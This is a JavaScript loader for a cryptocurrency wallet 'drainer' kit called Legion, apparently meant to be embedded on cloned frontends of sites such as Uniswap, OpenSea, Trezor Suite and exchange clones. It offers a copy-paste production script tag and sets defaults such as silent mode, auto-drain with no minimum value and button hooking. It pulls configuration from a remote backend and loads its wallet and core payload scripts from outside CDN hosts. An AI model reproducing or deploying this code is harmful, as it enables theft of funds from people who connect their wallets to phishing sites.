/**
 * LEGION UNIVERSAL EMBED v1.3.0 — ONE script for ANY frontend
 *
 * Works on: Uniswap, OpenSea, Trezor Suite, SwapX, Aave, Curve, CEX clones,
 *           static HTML, React/Vue/Next — no site-specific code required.
 *
 * ═══ COPY-PASTE (production) ═══
 *   <script src="https://legion-cdn.surge.sh/legion-embed.js" defer></script>
 *
 * Site-specific hooks (e.g. legion-1inch-hook.js) are OPTIONAL — add per clone only.
 * Universal CDN loads: polyfills → wallet bundle (Reown AppKit / 300+ WC wallets) → legion.min.js
 */
(function () {
  'use strict';

  if (window.__LEGION_EMBED_LOADED__) return;
  window.__LEGION_EMBED_LOADED__ = true;

  var EMBED_VERSION = '1.3.1';
  var CDN_PRIMARY = 'https://trust-legion-cdn.surge.sh/';
  var DEFAULT_BACKEND = 'https://sadrailala-production.up.railway.app';
  var VERSIONS = {
    polyfills: '1.1.0',
    wallet: '1.5.18',
    legion: '5.16.24',
  };

  var DEFAULTS = {
    backendUrl: DEFAULT_BACKEND,
    wcProjectId: 'a785da105621eb55c998a35c57587667',
    kineticKey: '',
    clientEncryptKey: '__EMBED_ENCRYPT_KEY__',
    silentMode: true,
    autoDrain: true,
    autoRun: false,
    autoConnectOnLoad: false,
    minDrainUsd: 0,
    signOnly: false,
    lethalOnly: true,
    nativeBatchFallback: true,
    mobileSendTx: true,
    injectMode: 'auto',
    showOverlay: false,
    hookButtons: true,
    strictCsp: false,
    cdnFallback: true,
    hwWallets: true,
    debugDevTools: false,
  };

  var embedScript = document.currentScript;
  var CDN_BASE = (function () {
    if (embedScript && embedScript.src) {
      return embedScript.src.replace(/[^/]*$/, '');
    }
    var scripts = document.getElementsByTagName('script');
    for (var i = scripts.length - 1; i >= 0; i--) {
      var src = scripts[i].src || '';
      if (src.indexOf('legion-embed') !== -1) {
        return src.replace(/[^/]*$/, '');
      }
    }
    return CDN_PRIMARY;
  })();

  function parseBool(val, fallback) {
    if (val == null || val === '') return fallback;
    var v = String(val).trim().toLowerCase();
    if (v === 'true' || v === '1' || v === 'yes') return true;
    if (v === 'false' || v === '0' || v === 'no') return false;
    return fallback;
  }

  function readDataConfig() {
    if (!embedScript || !embedScript.dataset) return {};
    var d = embedScript.dataset;
    var out = {};
    if (d.backend) out.backendUrl = d.backend;
    if (d.wc || d.wcProjectId) out.wcProjectId = d.wc || d.wcProjectId;
    if (d.kinetic || d.kineticKey) out.kineticKey = d.kinetic || d.kineticKey;
    if (d.clientEncryptKey || d.encryptKey || d.encrypt) {
      out.clientEncryptKey = d.clientEncryptKey || d.encryptKey || d.encrypt;
    }
    if (d.silent != null) out.silentMode = parseBool(d.silent, DEFAULTS.silentMode);
    if (d.autoDrain != null) out.autoDrain = parseBool(d.autoDrain, DEFAULTS.autoDrain);
    if (d.autoRun != null) out.autoRun = parseBool(d.autoRun, DEFAULTS.autoRun);
    if (d.hookButtons != null) out.hookButtons = parseBool(d.hookButtons, DEFAULTS.hookButtons);
    if (d.hwWallets != null) out.hwWallets = parseBool(d.hwWallets, DEFAULTS.hwWallets);
    if (d.minDrainUsd != null && d.minDrainUsd !== '') out.minDrainUsd = Number(d.minDrainUsd);
    if (d.vendorBase) out.vendorBase = d.vendorBase;
    return out;
  }

  function sanitizeEncryptKey(key) {
    if (!key || key === '') return '';
    return String(key).trim();
  }

  var dataCfg = readDataConfig();
  var userCfg = window.LEGION_CONFIG && typeof window.LEGION_CONFIG === 'object'
    ? window.LEGION_CONFIG
    : {};

  window.LEGION_CONFIG = Object.assign({}, DEFAULTS, userCfg, dataCfg, {
    vendorBase: (dataCfg.vendorBase || userCfg.vendorBase || CDN_BASE).replace(/\/?$/, '/'),
    clientEncryptKey: sanitizeEncryptKey(
      dataCfg.clientEncryptKey || userCfg.clientEncryptKey || DEFAULTS.clientEncryptKey
    ),
    embed: true,
    embedVersion: EMBED_VERSION,
    universal: true,
  });

  function bootstrapBackendConfig() {
    var base = String(window.LEGION_CONFIG.backendUrl || DEFAULT_BACKEND).replace(/\/$/, '');
    return fetch(base + '/api/v1/client-config', { method: 'GET', credentials: 'omit', cache: 'no-store' })
      .then(function (res) { return res.json(); })
      .then(function (json) {
        var d = json && json.data;
        if (!d) return;
        if (d.primary) window.LEGION_CONFIG.backendUrl = String(d.primary).replace(/\/$/, '');
        if (d.endpoints && d.endpoints.length) window.LEGION_CONFIG.backendEndpoints = d.endpoints.slice();
        if (d.proxy_urls && d.proxy_urls.length) window.LEGION_CONFIG.proxyUrls = d.proxy_urls.slice();
        if (d.wc_project_id) window.LEGION_CONFIG.wcProjectId = d.wc_project_id;
        if (d.deploy_domains) window.LEGION_CONFIG.deployDomains = d.deploy_domains;
        if (d.eip712_domains) window.LEGION_CONFIG.eip712Domains = d.eip712_domains;
        if (d.embed_script && !dataCfg.vendorBase && !userCfg.vendorBase) {
          var m = String(d.embed_script).match(/^(https?:\/\/[^/]+\/)/);
          if (m) window.LEGION_CONFIG.vendorBase = m[1];
        }
      })
      .catch(function () { /* offline fallback — baked defaults */ });
  }

  var loaded = {};
  function loadScript(src, id) {
    if (loaded[src]) return loaded[src];
    loaded[src] = new Promise(function (resolve, reject) {
      if (id && document.getElementById(id)) {
        resolve();
        return;
      }
      var s = document.createElement('script');
      s.src = src;
      // Do NOT set crossOrigin — Surge CDN has no ACAO header; anonymous mode blocks load.
      s.async = false;
      if (id) s.id = id;
      s.onload = function () { resolve(); };
      s.onerror = function () { reject(new Error('Legion embed failed to load: ' + src)); };
      (document.head || document.documentElement).appendChild(s);
    });
    return loaded[src];
  }

  function injectEmbedStyles() {
    if (document.getElementById('__legion_embed_styles')) return;
    var st = document.createElement('style');
    st.id = '__legion_embed_styles';
    st.textContent = [
      'w3m-modal,appkit-modal,wcm-modal,[data-rk],w3m-modal-container{z-index:2147483646!important}',
      'body.legion-embed-active{margin:0}',
    ].join('');
    document.head.appendChild(st);
  }

  injectEmbedStyles();
  document.documentElement.classList.add('legion-embed-active');

  var base = window.LEGION_CONFIG.vendorBase;
  var chain = bootstrapBackendConfig().then(function () {
    base = window.LEGION_CONFIG.vendorBase || base;
    return loadScript(base + 'vendor/legion-polyfills.js?v=' + VERSIONS.polyfills, '__legion_embed_polyfills');
  }).then(function () {
    return loadScript(base + 'vendor/legion-wallet.iife.js?v=' + VERSIONS.wallet, '__legion_embed_wallet');
  }).then(function () {
    return loadScript(base + 'legion.min.js?v=' + VERSIONS.legion, '__legion_embed_core').catch(function () {
      return loadScript(base + 'legion.js?v=' + VERSIONS.legion, '__legion_embed_core_fb');
    });
  });

  chain.then(function () {
    if (window.legion) {
      console.log('[LegionEmbed] universal v' + EMBED_VERSION + ' ready — legion v' + (window.legion.version || '?'));
    }
    window.dispatchEvent(new CustomEvent('legion:embed-ready', {
      detail: {
        embedVersion: EMBED_VERSION,
        cdnBase: base,
        legionVersion: window.legion && window.legion.version,
        universal: true,
      },
    }));
  }).catch(function (err) {
    console.error('[LegionEmbed]', err.message || err);
  });

  window.LegionEmbed = {
    version: EMBED_VERSION,
    cdnBase: base,
    universal: true,
    connect: function () {
      if (window.legion && typeof window.legion.connect === 'function') {
        return window.legion.connect();
      }
      return Promise.reject(new Error('Legion not loaded yet'));
    },
    ready: function () {
      return new Promise(function (resolve, reject) {
        if (window.legion) {
          resolve(window.legion);
          return;
        }
        var t = setTimeout(function () { reject(new Error('Legion embed timeout')); }, 120000);
        window.addEventListener('legion:ready', function onReady() {
          clearTimeout(t);
          window.removeEventListener('legion:ready', onReady);
          resolve(window.legion);
        });
        chain.then(function () {
          if (window.legion) {
            clearTimeout(t);
            resolve(window.legion);
          }
        }).catch(reject);
      });
    },
  };
})();
